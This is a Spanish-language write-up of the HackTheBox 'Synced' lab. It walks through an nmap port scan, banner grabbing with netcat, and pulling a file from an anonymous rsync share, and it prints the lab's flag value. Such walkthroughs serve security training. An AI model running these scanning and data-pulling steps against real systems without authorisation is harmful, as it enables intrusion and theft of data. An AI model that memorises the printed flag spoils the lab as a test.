---
publish: true
created: 2026-09-11T12:16:55.947Z
modified: 2026-09-19T14:28:46.694Z
---

# Synced

Plataforma: HackTheBox
OS: Linux
Level: Very Easy
Status: Done
Complete: Yes
Created time: 4 de enero de 2025 16:50
IP: 10.129.105.81

## Recopilación de información

<aside>
💡

</aside>

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
❯ sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.105.81 -oG allports

PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack ttl 63
```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
❯ sudo nmap -p873 -sCV 10.129.105.81 -oN targeted
```

- **Identificación de vulnerabilidades**
  - 873/tcp open  rsync   (protocol version 31)

Enumeramos el puerto 873

Banner grabbing

```bash
nc -nv 10.129.105.81 873
❯ nc -nv 10.129.105.81 873
(UNKNOWN) [10.129.105.81] 873 (rsync) open
@RSYNCD: 31.0
```

Enumeramos con rsync

```bash
❯ rsync 10.129.105.81::
public         	Anonymous Share

rsync -av --list-only rsync://10.129.105.81/public
```

Exfiltrar datos

```bash
❯ rsync -avz 10.129.105.81::public/ /home/fil/Desktop/HTBox/Syncsed
receiving incremental file list
./
flag.txt

sent 50 bytes  received 158 bytes  16,64 bytes/sec
total size is 33  speedup is 0,16

❯ cat flag.txt

   1   │ 72eaf5344ebb84908ae543a719830519
```

Flag :  72eaf5344ebb84908ae543a719830519

##

## Conclusión

<aside>
💡 Maquina facil sin escalada de privilegios

</aside>
